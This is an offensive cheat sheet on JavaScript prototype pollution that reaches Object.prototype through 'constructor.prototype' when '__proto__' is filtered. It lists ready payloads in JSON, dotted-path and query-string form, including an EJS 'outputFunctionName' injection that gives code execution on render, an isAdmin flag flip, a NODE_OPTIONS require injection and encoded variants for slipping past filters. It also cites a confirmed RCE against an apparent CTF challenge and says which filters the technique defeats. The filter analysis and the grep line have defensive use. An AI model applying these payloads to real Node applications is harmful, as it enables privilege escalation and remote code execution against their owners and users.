# The constructor path — reaching prototype when `__proto__` is filtered

`__proto__` is the key every filter knows. `constructor.prototype` is
the same object reached by a legal name — and the segment survives
most blacklists because `constructor` looks like a normal property.

---

## 1. The object-graph fact

For every plain object `o`:

```js
o.constructor                    === Object
o.constructor.prototype          === Object.prototype
o.constructor.prototype === o.__proto__    // true
```

So `{"constructor": {"prototype": {"x": 1}}}` merged recursively lands
`x` on `Object.prototype` — identical to `{"__proto__": {"x": 1}}`,
through a key that never literally spells `__proto__`.

## 2. Payload shapes

```json
{"constructor": {"prototype": {"marker": 1}}}
{"a": {"constructor": {"prototype": {"marker": 1}}}}
{"constructor": {"prototype": {"outputFunctionName": "x;CODE;var y"}}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"opts": {"constructor": {"prototype": {"env": {"NODE_OPTIONS":
  "--require /tmp/x"}}}}}
```

Nested-depth variants for merges that check only the top-level key:

```json
{"config": {"theme": {"constructor": {"prototype": {"m": 1}}}}}
```

## 3. The filters it beats, and the ones it doesn't

Beats:

- `key !== '__proto__'` — the literal-name check
- regex `/(^|\.)__proto__(\.|$)/` on the path
- `delete obj.__proto__` before the merge (constructor still resolves)
- a qs/parser filter that strips `__proto__` bracket segments

Loses to:

- a segment-level blacklist covering `constructor` AND `prototype`
  (lodash ≥4.17.21's fix lists all three)
- `Object.create(null)` merge targets — no `.constructor` to walk
- a merge using `Object.keys` + own-property check that treats
  `constructor` as data (lands as a literal own property, harmless)
- `Object.freeze(Object.prototype)` — the write target is frozen
- a `deny` list on the PATH joined with dots
  (`path.includes('constructor')`) — rare but exists

Probe order: `__proto__` first (cheap), `constructor.prototype`
second, then the deeper aliases below.

## 4. The deeper aliases

```js
// equivalent walks to Object.prototype
o['__proto__']
o.constructor.prototype
o.constructor['prototype']
({}).constructor.prototype
Object.getPrototypeOf(o)              // when a getPrototypeOf path exists
o.constructor.prototype.constructor.prototype  // idempotent
this.constructor.prototype            // in some JS contexts
[].__proto__                          // Array.prototype — different root
''.__proto__                          // String.prototype
(0).__proto__                         // Number.prototype
(()=>{}).__proto__                    // Function.prototype
```

`Array.prototype`, `String.prototype`, `Function.prototype` are
separate roots — polluting them doesn't hit `{}`, but does hit every
array/string/function — useful when the sink reads a method
(`[].map`, `str.split`) rather than an object property.

## 5. Confirmed usage — Chromatic

The `cscv2026-chromatic` card:

```json
{"title":"t","theme":{"constructor":{"prototype":
  {"outputFunctionName":"x;__append('[PP-MARKER]');var y"}}}}
```

`theme` is a legit theme object merged into the EJS options;
`constructor.prototype` walked to `Object.prototype`;
`outputFunctionName` was then compiled into the template's generated
function — RCE on render. Three layers: the carrier (`theme`), the
path (`constructor.prototype`), the sink (`outputFunctionName`).

## 6. The dotted-path variants

For APIs taking a path string (`$rename`, `set()`, `dset`):

```
__proto__.x
constructor.prototype.x
constructor[prototype].x          — bracket segment in qs/dotted libs
__proto__[x]
a.__proto__.x
a.constructor.prototype.x
prototype.x                       — when the walk STARTS at constructor
```

`dset`/`object-path`-style setters split on `.` — each segment is a
`get`/create step; `constructor` segment resolves to the real
constructor without any special case.

## 7. The qs/form variants

```
constructor[prototype][marker]=1
a[constructor][prototype][marker]=1
%63onstructor[prototype][marker]=1      — encoded c
constructor%5Bprototype%5D%5Bmarker%5D=1
```

qs builds `{"constructor": {"prototype": {"marker": "1"}}}` — the same
nested shape the JSON form carries.

## 8. Detection in white-box

```bash
grep -rnE "__proto__|constructor.*prototype" src/ | grep -vE "test|node_modules"
```

A filter that names `__proto__` but not `constructor` is the finding
already — write the `constructor.prototype` payload and it lands.

A `hasOwnProperty`-guarded merge (`if
(!dest.hasOwnProperty(k)) continue`) SKIPS `constructor` because it
exists on every object — that guard kills `constructor.prototype` AND
any overwrite of a real property; only NEW keys merge. It is a real
denial for this route.
